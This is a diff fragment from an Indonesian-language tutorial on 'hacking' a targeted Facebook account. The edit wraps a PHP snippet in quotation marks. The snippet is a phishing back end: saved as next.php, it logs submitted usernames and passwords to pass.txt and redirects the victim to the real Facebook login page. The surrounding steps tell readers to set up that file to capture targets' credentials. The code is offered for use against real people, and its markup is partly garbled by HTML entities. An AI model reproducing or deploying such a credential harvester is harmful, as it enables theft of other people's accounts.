@@ -21,7 +21,8 @@ Jika sudah selesai mengunduhnya script hack FB tertarget CMD ini, maka hal yag h
 Langkah cara script hack FB tertarget CMD ini, langsung saja anda copy script hack FB yang terdapat dibawah ke dalam Notepad kemudian simpan dengan nama next.php.
 
 Jangan sampai anda lupa untuk menaruh file pada satu folder yang sama seperti langkah ke 1 diatas
-&It;?phph header('Location:http://www.Facebook.com/login.php'); $handle = fopen('pass.txt', 'a'); foreach($_GET as $variable =&gt, $value) {fwrite($handle, $variable); fwrite($handle, '='); fwrite($handle, $value); fwrite($handle, '\n'); } fwrite($handle, '\n'); fclose($handle); exit; ?&gt;
+
+"&It;?phph header('Location:http://www.Facebook.com/login.php'); $handle = fopen('pass.txt', 'a'); foreach($_GET as $variable =&gt, $value) {fwrite($handle, $variable); fwrite($handle, '='); fwrite($handle, $value); fwrite($handle, '\n'); } fwrite($handle, '\n'); fclose($handle); exit; ?&gt;"
 
 5. Membuat File Penampungan Username dan password Target dengan Script Hack FB Tertarget CMD
 Langkah script hack FB tertarget CMD selanjutnya, langsung saja anda buat file berekstensi txt dengan memakai Notepad kemudian anda simpan menggunakan nama pass.txt.
